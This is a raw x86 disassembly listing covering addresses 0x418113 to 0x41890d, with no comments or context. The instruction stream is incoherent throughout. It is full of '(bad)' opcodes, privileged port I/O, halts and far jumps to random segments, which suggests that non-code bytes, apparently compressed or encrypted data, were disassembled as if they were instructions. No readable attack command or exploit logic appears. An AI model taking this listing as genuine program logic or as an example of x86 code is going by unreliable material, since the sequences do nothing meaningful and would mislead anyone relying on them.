  418113:	mov    al,cl
  418115:	sub    eax,0x6124fd3e
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx+0x1f]
  418120:	popa   
  418121:	push   esi
  418122:	not    DWORD PTR [ebp+eiz*4+0x3d]
  418126:	mov    esp,0xeda0e3ec
  41812b:	out    dx,eax
  41812c:	add    cl,BYTE PTR [ecx-0x4a31a05a]
  418132:	(bad)  
  418133:	out    dx,eax
  418134:	mov    ebp,0x6b011a36
  418139:	jmp    0x7f0569d7
  41813e:	xchg   ebx,eax
  41813f:	popa   
  418140:	data16 aam 0xb7
  418143:	(bad)  
  418144:	fild   QWORD PTR [ecx]
  418146:	xchg   edx,eax
  418147:	shl    edx,0x4e
  41814a:	xchg   ecx,eax
  41814b:	gs imul ecx,ebx,0x16
  41814f:	mov    edi,esi
  418151:	or     edi,DWORD PTR [edx-0x55c9cfc4]
  418157:	jp     0x4181d2
  418159:	or     eax,0x68fe5fd6
  41815e:	loope  0x418178
  418160:	outs   dx,DWORD PTR ds:[esi]
  418161:	retf   
  418162:	mov    eax,0xd8f4309f
  418167:	ins    BYTE PTR es:[edi],dx
  418168:	mov    WORD PTR [eax-0x20],?
  41816b:	(bad)
  41816e:	jne    0x418113
  418170:	mov    bl,0x10
  418172:	inc    ecx
  418173:	add    DWORD PTR [ebx+edx*1],0xffffff92
  418177:	cwde   
  418178:	pushf  
  418179:	mov    edx,0x3030c100
  41817e:	ja     0x4181d0
  418180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418181:	and    al,0xb8
  418183:	cmp    BYTE PTR [ebx],ch
  418185:	sub    cl,ch
  418187:	rol    DWORD PTR [edx],1
  418189:	cmc    
  41818a:	cld    
  41818b:	pop    ebx
  41818c:	ja     0x4181c2
  41818e:	aam    0xb1
  418190:	in     al,0xe6
  418192:	sbb    edi,ebp
  418194:	sub    DWORD PTR [eax],ebx
  418196:	enter  0x9c4,0xe6
  41819a:	(bad)  [esi+0x1e45d0e1]
  4181a0:	xor    eax,0xd4046976
  4181a5:	cmp    eax,0x9d06c2af
  4181aa:	cmc    
  4181ab:	js     0x418217
  4181ad:	fs das 
  4181af:	js     0x41815e
  4181b1:	rcl    cl,cl
  4181b3:	add    ah,BYTE PTR [edi]
  4181b5:	cld    
  4181b6:	(bad)  
  4181b7:	mov    ds,WORD PTR [eax-0x2c]
  4181ba:	inc    ebx
  4181bb:	push   0x59e6f310
  4181c0:	or     DWORD PTR [esi+0x38c3a1c2],ebx
  4181c6:	ror    DWORD PTR [edi+0x13345eeb],0x83
  4181cd:	fwait
  4181ce:	sub    ebx,DWORD PTR [edx+0x34546a8b]
  4181d4:	pop    eax
  4181d5:	push   esp
  4181d6:	test   al,0x6d
  4181d8:	fs int 0xbe
  4181db:	out    0x4e,al
  4181dd:	popf   
  4181de:	push   edi
  4181df:	out    0x35,eax
  4181e1:	outs   dx,DWORD PTR ds:[esi]
  4181e2:	mov    ebx,0xf57edf88
  4181e7:	stos   BYTE PTR es:[edi],al
  4181e8:	iret   
  4181e9:	xor    BYTE PTR [ebx],cl
  4181eb:	push   ds
  4181ec:	mov    ds:0xf9b57f8f,al
  4181f1:	xchg   esp,eax
  4181f2:	cmp    esi,DWORD PTR [esi-0x1a]
  4181f5:	(bad)  
  4181f6:	jle    0x418255
  4181f8:	push   cs
  4181f9:	push   eax
  4181fa:	out    dx,ax
  4181fc:	shl    BYTE PTR [ebp+0x7cfa8344],0x0
  418203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418204:	or     DWORD PTR [ebx-0x7e],edx
  418207:	rcr    BYTE PTR [ecx+eiz*4-0x13de8c6a],0xad
  41820f:	in     al,0x64
  418211:	rol    DWORD PTR [esi],cl
  418213:	imul   ebp,DWORD PTR [edx-0x8],0x2b
  418217:	mov    ebp,0x6839214a
  41821c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41821d:	fcom   DWORD PTR [ecx-0x51fb293d]
  418223:	add    ecx,eax
  418225:	data16 loop 0x4181b2
  418228:	cld    
  418229:	pop    ebx
  41822a:	(bad)  
  41822b:	iret   
  41822c:	mov    ds:0x9e72da63,al
  418231:	pop    ebx
  418232:	or     BYTE PTR [ecx+0x2f],dh
  418235:	jno    0x418274
  418237:	jg     0x418242
  418239:	cmp    cl,bh
  41823b:	into   
  41823c:	mov    dh,0x8b
  41823e:	ins    BYTE PTR es:[edi],dx
  41823f:	mov    ds:0x12f65ff8,al
  418244:	(bad)  
  418247:	test   ecx,edx
  418249:	ss pop esp
  41824b:	out    dx,al
  41824c:	hlt    
  41824d:	xor    eax,0xaf8431a0
  418252:	div    BYTE PTR [ebx-0x1b1e2cbf]
  418258:	cmp    DWORD PTR ds:0xed8053da,esi
  41825e:	inc    ebx
  41825f:	pop    eax
  418260:	int    0xa8
  418262:	add    eax,0x8660254f
  418267:	out    0x30,eax
  418269:	ja     0x4181ff
  41826b:	mov    ch,0x87
  41826d:	xchg   ecx,eax
  41826e:	out    0x56,al
  418270:	hlt    
  418271:	dec    esi
  418272:	mov    edi,0x8d3c0a5d
  418277:	mov    BYTE PTR [ebx+0x37],bh
  41827a:	lea    esp,[bp+di-0x4209]
  41827f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418280:	and    DWORD PTR [esi],edx
  418282:	mov    ebp,0x226393cb
  418287:	mov    ebp,0x39d92059
  41828c:	inc    ebx
  41828d:	scas   al,BYTE PTR es:[edi]
  41828e:	xor    BYTE PTR [edx-0x7b],ah
  418291:	sub    BYTE PTR [eax+0x21ba7c5d],bl
  418297:	leave  
  418298:	gs aaa 
  41829a:	mov    ebp,0x35d788ce
  41829f:	fs (bad) 
  4182a1:	cld    
  4182a2:	rcr    bl,1
  4182a4:	pop    es
  4182a5:	mov    eax,ds:0x5b79dfac
  4182aa:	and    eax,0xec8b82aa
  4182af:	cwde   
  4182b0:	mov    edx,0xfdf7dca4
  4182b5:	ret    0x3d9c
  4182b8:	ret    
  4182b9:	retf   
  4182ba:	add    DWORD PTR [eax+0x6d],0x8076a2bb
  4182c1:	jecxz  0x4182cb
  4182c3:	(bad)  
  4182c4:	push   esp
  4182c5:	add    eax,0xb9d58aec
  4182ca:	cmp    eax,0x39a8ea67
  4182cf:	in     al,dx
  4182d0:	enter  0x46c6,0x60
  4182d4:	rcr    al,1
  4182d6:	jecxz  0x418350
  4182d8:	mov    bh,0x25
  4182da:	cli    
  4182db:	lea    ecx,[ebp-0x7e98179f]
  4182e1:	cmp    ecx,esi
  4182e3:	adc    DWORD PTR [ecx],edx
  4182e5:	jae    0x41829f
  4182e7:	pop    edx
  4182e8:	aaa    
  4182e9:	fild   QWORD PTR [esi]
  4182eb:	mov    dh,BYTE PTR [esi+eiz*8+0x40]
  4182ef:	cmp    DWORD PTR [ebp-0x30],ebx
  4182f2:	leave  
  4182f3:	or     eax,eax
  4182f5:	and    al,0x37
  4182f7:	xor    BYTE PTR [esi-0xe640e14],ah
  4182fd:	into   
  4182fe:	xlat   BYTE PTR ds:[ebx]
  4182ff:	retf   
  418300:	xchg   esp,eax
  418301:	mov    es,WORD PTR ds:0xd9e34c58
  418307:	jns    0x4182b0
  418309:	mov    edi,DWORD PTR [eax-0x1f]
  41830c:	xor    DWORD PTR [ecx],edx
  41830e:	nop
  41830f:	cmp    BYTE PTR [ebx+0x1d],dh
  418312:	and    ebp,0xfffffff6
  418315:	nop
  418316:	pop    ecx
  418317:	lods   eax,DWORD PTR ds:[esi]
  418318:	in     al,dx
  418319:	mov    al,0x1c
  41831b:	call   0xb08c:0x9d1ea19e
  418322:	push   ebx
  418323:	loop   0x41835a
  418325:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418326:	pop    ds
  418327:	icebp  
  418328:	sbb    bl,BYTE PTR ds:0xc432512f
  41832e:	loop   0x418326
  418330:	mov    esi,0xc48c0914
  418335:	imul   edi,DWORD PTR [ecx+0x132fe078],0x24
  41833c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41833d:	jmp    0x335b0ce5
  418342:	mov    edi,0x83e7a06f
  418347:	icebp  
  418348:	xchg   BYTE PTR [esi+eax*4-0x6570145a],ah
  41834f:	mov    ah,0x83
  418351:	sbb    DWORD PTR [esi+0x7899fcb1],esp
  418357:	out    0x1b,eax
  418359:	aas    
  41835a:	adc    DWORD PTR [ebp+0x617ab784],esp
  418360:	mov    esp,0xd0f25673
  418365:	or     al,0x67
  418367:	pushw  ds
  418369:	arpl   cx,bx
  41836b:	(bad)  
  41836c:	xlat   BYTE PTR ds:[ebx]
  41836d:	rol    DWORD PTR [esi-0x3afdc486],cl
  418373:	jne    0x418330
  418375:	pop    ecx
  418376:	test   al,0xc4
  418378:	cmp    BYTE PTR [ebx-0x6],0x2e
  41837c:	push   0x134350d7
  418381:	icebp  
  418382:	aaa    
  418383:	pop    esi
  418384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418385:	sti    
  418386:	cli    
  418387:	arpl   WORD PTR [esi-0x1df1f808],dx
  41838d:	inc    ecx
  41838e:	in     al,dx
  41838f:	scas   eax,DWORD PTR es:[edi]
  418390:	sbb    ecx,DWORD PTR [ebx]
  418392:	and    cl,dh
  418394:	dec    eax
  418395:	(bad)  
  418396:	test   al,0xca
  418398:	xchg   ebp,eax
  418399:	sbb    eax,0xd7cbcd3b
  41839e:	mov    ah,0x9a
  4183a0:	ficomp DWORD PTR [ecx+0x16ed6298]
  4183a6:	mov    eax,ds:0x6e0f5a79
  4183ab:	test   DWORD PTR [edx+edx*4+0x3cc6417e],0x3dd469d2
  4183b6:	mov    dh,0x6e
  4183b8:	sub    eax,0x939a3aff
  4183bd:	retf   0xe7b8
  4183c0:	and    esp,DWORD PTR [ecx-0x51f9a125]
  4183c6:	dec    edx
  4183c7:	xchg   ebx,eax
  4183c8:	push   esp
  4183c9:	push   ebx
  4183ca:	out    0xb1,eax
  4183cc:	js     0x418447
  4183ce:	(bad)  
  4183cf:	mov    esp,0xb21a8ea
  4183d4:	cmp    al,0x7f
  4183d6:	loop   0x418371
  4183d8:	mov    eax,0xf1e6db87
  4183dd:	sbb    al,BYTE PTR [ebx]
  4183df:	mov    edx,0xa75ad7d5
  4183e4:	enter  0x2963,0xd1
  4183e8:	rcr    dl,cl
  4183ea:	mov    ecx,0x2925d4d3
  4183ef:	fmul   DWORD PTR ds:0xc3b5947
  4183f5:	jns    0x418449
  4183f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183f8:	xchg   ebp,eax
  4183f9:	sub    BYTE PTR [ebx+ebx*1],dl
  4183fc:	pop    ebx
  4183fd:	and    eax,0x381726dc
  418402:	pop    edx
  418403:	add    bh,bh
  418405:	pop    ds
  418406:	js     0x418460
  418408:	push   0x71b3d701
  41840d:	stc    
  41840e:	or     eax,0x882f7b6e
  418413:	cwde   
  418414:	jmp    FWORD PTR [ebx+0x510a9bde]
  41841a:	mov    ebp,0x7f953526
  41841f:	fcmovb st,st(2)
  418421:	pop    ds
  418422:	xchg   esp,eax
  418423:	sbb    BYTE PTR [ecx-0x76bae957],0x1f
  41842a:	add    bl,BYTE PTR es:[ebp-0x43]
  41842e:	out    dx,al
  41842f:	shr    DWORD PTR [edi+edi*8],cl
  418432:	stc    
  418433:	rcr    cl,0x77
  418436:	xchg   esi,eax
  418437:	ret    0x877e
  41843a:	outs   dx,DWORD PTR ds:[esi]
  41843b:	das    
  41843c:	xor    ah,bl
  41843e:	call   0x3fa0b31
  418443:	scas   eax,DWORD PTR es:[edi]
  418444:	xchg   esi,eax
  418445:	fwait
  418446:	jae    0x418451
  418448:	les    ebp,FWORD PTR ds:0xb174b478
  41844e:	sbb    ecx,DWORD PTR [edi]
  418450:	add    al,0x47
  418452:	lea    ecx,[ebx-0x34]
  418455:	std    
  418456:	dec    edi
  418457:	push   eax
  418458:	push   edx
  418459:	cmp    al,0xa9
  41845b:	pop    ebp
  41845c:	(bad)  
  41845e:	xchg   esi,eax
  41845f:	mov    ecx,0x12708cf3
  418464:	retf   0x1c71
  418467:	push   esi
  418468:	into   
  418469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846a:	inc    eax
  41846b:	xchg   ecx,eax
  41846c:	fst    DWORD PTR [edx+0x8]
  41846f:	retf   
  418470:	ret    0xbf42
  418473:	inc    edi
  418474:	xor    bl,bl
  418476:	fcmovnu st,st(5)
  418478:	sub    DWORD PTR [esi],esi
  41847a:	mov    al,BYTE PTR [ebx-0x78c3fa64]
  418480:	mov    bl,0x57
  418482:	gs stos DWORD PTR es:[edi],eax
  418484:	or     eax,ecx
  418486:	mov    edi,0xc43260d0
  41848b:	out    0x7a,al
  41848d:	mov    ebx,0x6fa6cbcf
  418492:	and    DWORD PTR [ebp+0x7],edi
  418495:	jb     0x4184a7
  418497:	xor    cl,ah
  418499:	imul   ebx,DWORD PTR [esi+edi*2+0x46],0x79
  41849e:	sub    al,0xbd
  4184a0:	ss into 
  4184a2:	pop    DWORD PTR fs:0x2b892d4b
  4184a9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4184ab:	and    esi,eax
  4184ad:	int    0xed
  4184af:	popa   
  4184b0:	imul   ebx,DWORD PTR [ecx+eiz*2],0x5005368a
  4184b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184b8:	fwait
  4184b9:	loope  0x41847e
  4184bb:	sar    BYTE PTR [esi+ebp*2+0x648caa7],0xd7
  4184c3:	cmovns eax,DWORD PTR [eax-0x3abdd076]
  4184ca:	loop   0x418511
  4184cc:	stos   DWORD PTR es:[edi],eax
  4184cd:	(bad)  
  4184ce:	jg     0x418536
  4184d0:	in     al,dx
  4184d1:	push   ds
  4184d2:	jp     0x4184dd
  4184d4:	(bad)  
  4184d5:	ins    BYTE PTR es:[edi],dx
  4184d6:	pushf  
  4184d7:	pop    ecx
  4184d8:	pop    esp
  4184d9:	xchg   ebx,eax
  4184da:	pop    es
  4184db:	mov    ebp,0x2ba1e6a7
  4184e0:	mov    esi,0x3f4737ee
  4184e5:	(bad)  
  4184e6:	into   
  4184e7:	sub    dl,BYTE PTR [edi]
  4184e9:	fst    QWORD PTR [ebx+esi*1]
  4184ec:	test   al,0xd1
  4184ee:	icebp  
  4184ef:	push   edx
  4184f0:	add    al,BYTE PTR [esi]
  4184f2:	neg    DWORD PTR [edx-0x45]
  4184f5:	pop    ss
  4184f6:	call   0x8e5f2cad
  4184fb:	icebp  
  4184fc:	fmulp  st(5),st
  4184fe:	adc    al,0x29
  418500:	xor    BYTE PTR [edx+0x32465508],0xb6
  418507:	mov    WORD PTR [ecx+ecx*4],ds
  41850a:	pop    edi
  41850b:	mov    edx,0xc506d0a0
  418510:	push   0x65
  418512:	loopne 0x418562
  418514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418515:	pop    edi
  418516:	pushf  
  418517:	fisubr DWORD PTR [eax+eiz*8+0x329e1cc8]
  41851e:	adc    BYTE PTR [edi-0x3a],bh
  418521:	inc    esp
  418522:	mov    ds:0x3e66cb77,eax
  418527:	fist   WORD PTR [ecx+0x14]
  41852a:	mov    edx,0xcdae6007
  41852f:	int3   
  418530:	test   BYTE PTR [edi-0x47],0x1c
  418534:	dec    ebx
  418535:	cmp    ebp,DWORD PTR [ecx+0x3c168e50]
  41853b:	gs mov cl,0x9e
  41853e:	mov    ah,0x45
  418540:	imul   DWORD PTR [edi]
  418542:	test   edi,0x41298c42
  418548:	pushf  
  418549:	sbb    edx,DWORD PTR [ecx+ebp*4-0x45ccf790]
  418550:	outs   dx,DWORD PTR ds:[esi]
  418551:	jmp    0x9955:0xf61ca4e0
  418558:	sub    edx,DWORD PTR [ecx]
  41855a:	cli    
  41855b:	nop
  41855c:	mov    ebp,0x64f2c05b
  418561:	inc    eax
  418562:	out    dx,eax
  418563:	add    al,0x42
  418565:	(bad)  
  418566:	xchg   ebx,eax
  418567:	and    DWORD PTR [ebx+eiz*1+0x1bcdbb00],esi
  41856e:	xor    eax,ebp
  418570:	cmp    ebp,DWORD PTR [edx+eax*1+0x63]
  418574:	or     esi,esi
  418576:	xor    al,0xe3
  418578:	mov    dl,0x4b
  41857a:	into   
  41857b:	add    al,0xee
  41857d:	out    0xf1,al
  41857f:	mov    ch,0xf2
  418581:	add    DWORD PTR [ebx],ecx
  418583:	(bad)  
  418585:	shr    BYTE PTR [ecx],1
  418587:	or     DWORD PTR [ebp-0x277f46d9],edx
  41858d:	push   ds
  41858e:	add    BYTE PTR [edi+esi*2],bh
  418591:	rcr    DWORD PTR [edx+0x33],1
  418594:	jnp    0x41859a
  418596:	cmp    edx,DWORD PTR [ecx+0x27838a9c]
  41859c:	(bad)  
  41859d:	push   esi
  41859e:	mov    esi,0x22e043eb
  4185a3:	pop    ss
  4185a4:	lods   al,BYTE PTR ds:[esi]
  4185a5:	push   esi
  4185a6:	loope  0x4185f0
  4185a8:	push   ecx
  4185a9:	and    DWORD PTR [ebp+0x1afdc499],0x15
  4185b0:	les    edi,FWORD PTR [ebp-0x27]
  4185b3:	call   0x9dd7:0xdb65ca9e
  4185ba:	xchg   esi,eax
  4185bb:	xlat   BYTE PTR ds:[ebx]
  4185bc:	sbb    al,BYTE PTR [ecx+esi*2+0x5c]
  4185c0:	fisub  WORD PTR [edx-0x288a04ee]
  4185c6:	mul    DWORD PTR [edi-0x4c]
  4185c9:	clc    
  4185ca:	hlt    
  4185cb:	mov    DWORD PTR [ebp-0x2d72c88],esp
  4185d1:	xor    DWORD PTR [edx+0x104b3d7],edi
  4185d7:	int3   
  4185d8:	lahf   
  4185d9:	sub    DWORD PTR [ebx+0x3894db22],edx
  4185df:	gs int3 
  4185e1:	jg     0x4185c0
  4185e3:	xchg   ebp,eax
  4185e4:	into   
  4185e5:	cmp    eax,0x66260c52
  4185ea:	out    0x70,al
  4185ec:	cdq    
  4185ed:	in     eax,dx
  4185ee:	cs cmp al,0xe4
  4185f1:	add    edx,DWORD PTR [eax+esi*4-0x45]
  4185f5:	xchg   esp,eax
  4185f6:	inc    edi
  4185f7:	(bad)  
  4185f8:	fwait
  4185f9:	cmp    DWORD PTR [ecx-0x5272f125],eax
  4185ff:	ss mov ch,0xe
  418602:	jle    0x418598
  418604:	mov    BYTE PTR [edi],ch
  418606:	cmp    DWORD PTR ds:0xed417ea1,esi
  41860c:	pusha  
  41860d:	retf   0x766c
  418610:	in     eax,dx
  418611:	sti    
  418612:	int    0xa0
  418614:	push   esi
  418615:	adc    eax,0xefeb5d63
  41861a:	push   es
  41861b:	push   ebx
  41861c:	outs   dx,DWORD PTR ds:[esi]
  41861d:	fwait
  41861e:	shr    al,0x7a
  418621:	sub    DWORD PTR [ecx],eax
  418623:	loope  0x41869f
  418625:	adc    ebp,DWORD PTR [ebx+0x65]
  418628:	add    esp,DWORD PTR [ebx]
  41862a:	mov    dl,0x5c
  41862c:	fadd   QWORD PTR [eax-0x6f]
  41862f:	jmp    0xb59b92e1
  418634:	sbb    al,0x65
  418636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418637:	dec    ebx
  418638:	adc    BYTE PTR [esi+0xa5d530a],dl
  41863e:	or     al,0xdd
  418640:	adc    eax,0x4fa9c3eb
  418645:	or     esp,DWORD PTR [ecx+0x26cbd4de]
  41864b:	jbe    0x4185f3
  41864d:	or     eax,0x84b26228
  418652:	int3   
  418653:	push   ds
  418654:	or     eax,0xdb06c972
  418659:	pop    ecx
  41865a:	icebp  
  41865b:	imul   ebp,DWORD PTR [edi],0x1b
  41865e:	jg     0x4186c3
  418660:	pusha  
  418661:	aam    0xaa
  418663:	push   ebx
  418664:	into   
  418665:	add    ebx,DWORD PTR [esi]
  418667:	adc    DWORD PTR ds:0xd4b497c4,0x4d2b6a3b
  418671:	je     0x418649
  418673:	jnp    0x4186db
  418675:	sbb    eax,0x6370094a
  41867a:	xchg   ecx,eax
  41867b:	jecxz  0x418612
  41867d:	cli    
  41867e:	pop    esp
  41867f:	in     eax,dx
  418680:	push   es
  418681:	dec    ebp
  418682:	sahf   
  418683:	and    al,BYTE PTR [edi]
  418685:	xor    cl,dl
  418687:	mov    al,ds:0x24ce007e
  41868c:	mov    eax,ds:0x158c9ea5
  418691:	pop    edx
  418692:	shl    DWORD PTR fs:[bp+0x2dd],0x61
  418699:	xor    DWORD PTR [esi-0x4],edx
  41869c:	xchg   BYTE PTR [eax],al
  41869e:	sub    edi,eax
  4186a0:	sbb    dh,BYTE PTR [edi+0x1d10044f]
  4186a6:	mov    eax,ds:0x953d7b59
  4186ab:	pop    ss
  4186ac:	shl    DWORD PTR [ecx-0xaf11237],cl
  4186b2:	push   eax
  4186b3:	xor    esi,esp
  4186b5:	neg    DWORD PTR [edx-0x42]
  4186b8:	psubq  mm2,QWORD PTR [ecx+ebp*8-0x40e87a2a]
  4186c0:	(bad)  
  4186c1:	mov    dl,0xa
  4186c3:	sub    BYTE PTR [eax-0x59],dh
  4186c6:	adc    al,0x46
  4186c8:	scas   al,BYTE PTR es:[edi]
  4186c9:	pop    esp
  4186ca:	lods   al,BYTE PTR ds:[esi]
  4186cb:	mov    edx,0x6d0acdd7
  4186d0:	sar    BYTE PTR [esi+0x2c],cl
  4186d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186d4:	mov    bl,ah
  4186d6:	mov    ebx,0xfe6257d6
  4186db:	mov    bh,0x2f
  4186dd:	xor    ecx,DWORD PTR [eax+ecx*8+0x3bef629e]
  4186e4:	out    0xad,eax
  4186e6:	out    0x70,al
  4186e8:	inc    edi
  4186e9:	add    esi,DWORD PTR [esi+0x3e]
  4186ec:	pop    edx
  4186ed:	adc    al,0x36
  4186ef:	call   0xbb2b1566
  4186f4:	call   0xe563:0xf53d8e20
  4186fb:	or     esi,ecx
  4186fd:	es push eax
  4186ff:	push   esp
  418700:	outs   dx,BYTE PTR ds:[esi]
  418701:	push   cs
  418702:	arpl   WORD PTR [ebx],si
  418704:	xchg   DWORD PTR [ebx+0x15477f81],esi
  41870a:	mov    ch,0x54
  41870c:	push   edi
  41870d:	mov    WORD PTR ds:0xce26e1a0,cs
  418713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418714:	mov    ecx,ebx
  418716:	pop    ebp
  418717:	fst    QWORD PTR ds:0x1beb9c12
  41871d:	shl    ebp,cl
  41871f:	int    0x4f
  418721:	call   0x658f:0x517cdaf4
  418728:	bound  eax,QWORD PTR [edx+0x15]
  41872b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41872c:	das    
  41872d:	(bad)  
  41872e:	or     DWORD PTR [esi],ebx
  418730:	or     DWORD PTR [edx],esp
  418732:	aas    
  418733:	mov    ch,0xdd
  418735:	pushf  
  418736:	clc    
  418737:	cli    
  418738:	pop    ss
  418739:	xchg   esp,eax
  41873a:	pop    ebp
  41873b:	dec    esp
  41873c:	stc    
  41873d:	icebp  
  41873e:	pop    ebx
  41873f:	lods   eax,DWORD PTR ds:[esi]
  418740:	cli    
  418741:	jecxz  0x418750
  418743:	jno    0x4186e1
  418745:	jb     0x4186de
  418747:	rcl    BYTE PTR [eax+0x21498428],0x61
  41874e:	hlt    
  41874f:	dec    esp
  418750:	sbb    eax,0x127e1bd6
  418755:	pushf  
  418756:	xchg   esi,ecx
  418758:	popf   
  418759:	fs xchg edx,eax
  41875b:	mov    eax,0xe7c62f55
  418760:	mov    eax,0x9ed69aee
  418765:	dec    edi
  418766:	loopne 0x41872c
  418768:	lahf   
  418769:	retf   0xe3d8
  41876c:	into   
  41876d:	dec    edx
  41876e:	icebp  
  41876f:	jno    0x41877a
  418771:	loop   0x41875f
  418773:	add    al,0xc1
  418775:	js     0x4187d1
  418777:	cmp    bh,BYTE PTR [eax-0x3d442fa9]
  41877d:	out    0xf6,eax
  41877f:	and    edx,DWORD PTR [eax-0x53ea1a5d]
  418785:	xchg   ebp,ebp
  418787:	out    dx,eax
  418788:	sbb    eax,0x8dd1d717
  41878d:	es push ds
  41878f:	int3   
  418790:	jl     0x418741
  418792:	sbb    cl,BYTE PTR [ecx+0x485ab497]
  418798:	xchg   edx,eax
  418799:	cmp    ebp,ebx
  41879b:	mov    ds:0x535bfb82,eax
  4187a0:	imul   BYTE PTR [esi]
  4187a2:	shl    BYTE PTR [edx],0xc
  4187a5:	dec    ebp
  4187a6:	xchg   DWORD PTR [eax-0x5d9f1e0d],esp
  4187ac:	xor    eax,0xc4d27929
  4187b1:	test   eax,0xe8227898
  4187b6:	scas   eax,DWORD PTR es:[edi]
  4187b7:	mov    ebx,0xc599d34b
  4187bc:	jae    0x4187a9
  4187be:	ja     0x41877f
  4187c0:	inc    BYTE PTR [ebx-0x20fe8a21]
  4187c6:	pop    ebx
  4187c7:	daa    
  4187c8:	mov    edi,0xde0d9561
  4187cd:	(bad)  
  4187ce:	sti    
  4187cf:	lahf   
  4187d0:	push   ebp
  4187d1:	out    dx,eax
  4187d2:	mov    ds:0x6a4a3915,al
  4187d7:	inc    edi
  4187d8:	and    edx,ebx
  4187da:	pop    eax
  4187db:	(bad)  
  4187dc:	mov    esp,0x6dad2325
  4187e1:	add    al,0x72
  4187e3:	push   esi
  4187e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187e5:	mov    edx,0xc0b087cc
  4187ea:	(bad)  
  4187eb:	cwde   
  4187ec:	mov    ss:0xbcea3e83,eax
  4187f2:	sti    
  4187f3:	nop
  4187f4:	fs pop edi
  4187f6:	popf   
  4187f7:	fadd   QWORD PTR [ebp-0x10]
  4187fa:	xchg   ebp,eax
  4187fb:	loope  0x4187b3
  4187fd:	leave  
  4187fe:	div    bh
  418800:	jmp    0x5070:0xe3262ba4
  418807:	pop    ds
  418808:	scas   al,BYTE PTR es:[edi]
  418809:	sbb    al,0x8a
  41880b:	xchg   edi,eax
  41880c:	mov    cs,esp
  41880e:	pop    ecx
  41880f:	es inc ebx
  418811:	shl    DWORD PTR [eax],cl
  418813:	jae    0x4187fd
  418815:	add    eax,0xfb7dc7aa
  41881a:	into   
  41881b:	mov    eax,0x56547d16
  418820:	mov    esp,0x27a81ae
  418825:	in     eax,dx
  418826:	xor    eax,0x18ce37e7
  41882b:	mov    al,dl
  41882d:	call   0x54f143cf
  418832:	popa   
  418833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418834:	xchg   BYTE PTR [ecx],dl
  418836:	jg     0x4188a9
  418838:	xchg   edx,eax
  418839:	dec    ebp
  41883a:	out    dx,eax
  41883b:	in     al,dx
  41883c:	push   edx
  41883d:	scas   eax,DWORD PTR es:[edi]
  41883e:	sti    
  41883f:	popf   
  418840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418841:	cmc    
  418842:	xchg   edx,eax
  418843:	xchg   ebp,eax
  418844:	pushf  
  418845:	das    
  418846:	inc    esp
  418847:	jbe    0x418812
  418849:	jmp    0x10fa9d79
  41884e:	sub    al,0xb0
  418850:	mov    ebp,0x9a3de828
  418855:	xchg   DWORD PTR [ecx-0x43bb57f8],eax
  41885b:	dec    ebp
  41885c:	icebp  
  41885d:	cmp    cl,dl
  41885f:	push   eax
  418860:	out    0x0,al
  418862:	call   0x6fde:0x493f6e64
  418869:	inc    ebx
  41886a:	loope  0x41882e
  41886c:	fbld   TBYTE PTR [ebp-0x5]
  41886f:	xchg   ebx,eax
  418870:	inc    esp
  418871:	sbb    eax,0x49b4f7f6
  418876:	sbb    ch,BYTE PTR ds:0xecd6861f
  41887c:	cli    
  41887d:	into   
  41887e:	inc    edx
  41887f:	push   esp
  418880:	icebp  
  418881:	inc    edx
  418882:	pop    esp
  418883:	push   ds
  418884:	rcr    al,cl
  418886:	mov    esp,0x4287aab0
  41888b:	and    al,0x4b
  41888d:	cli    
  41888e:	shl    esi,cl
  418890:	inc    eax
  418891:	sub    al,0x2b
  418893:	repz or eax,0x84c5543c
  418899:	push   eax
  41889a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41889b:	or     al,0x58
  41889d:	inc    edi
  41889e:	jg     0x418842
  4188a0:	xor    eax,0x2dc2646d
  4188a5:	sub    al,0xe3
  4188a7:	or     DWORD PTR [ecx+0x33],esp
  4188aa:	push   0xffffff95
  4188ac:	mov    al,ds:0xa190ed55
  4188b1:	pop    ecx
  4188b2:	rol    bl,cl
  4188b4:	jmp    0x4188b8
  4188b6:	push   0x30f1c79a
  4188bb:	or     al,0x21
  4188bd:	mov    ds:0xb3c6e4ac,eax
  4188c2:	push   cs
  4188c3:	daa    
  4188c4:	ret    0xa82c
  4188c7:	inc    edi
  4188c8:	std    
  4188c9:	in     eax,dx
  4188ca:	pop    es
  4188cb:	push   ebp
  4188cc:	push   ss
  4188cd:	das    
  4188ce:	sbb    al,0x16
  4188d0:	retf   
  4188d1:	test   BYTE PTR ds:0x190e610,bl
  4188d7:	xor    ebx,DWORD PTR [esi-0x73]
  4188da:	mov    al,ds:0x95e2c9f3
  4188df:	mov    ds:0x31496635,eax
  4188e4:	jg     0x418868
  4188e6:	inc    esp
  4188e7:	push   edx
  4188e8:	outs   dx,BYTE PTR ds:[esi]
  4188e9:	mov    dl,0x55
  4188eb:	imul   esi,DWORD PTR [ebx],0xf1f55b07
  4188f1:	xchg   esi,eax
  4188f2:	test   al,0x21
  4188f4:	fistp  QWORD PTR [eax]
  4188f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188f7:	pop    edi
  4188f8:	adc    al,0x2d
  4188fa:	cmp    al,0xa
  4188fc:	jb     0x41893a
  4188fe:	in     eax,0x26
  418900:	call   0x683a766b
  418905:	jmp    0x499:0x138373d2
  41890c:	push   ebp
  41890d:	stos   DWORD PTR es:[edi],eax
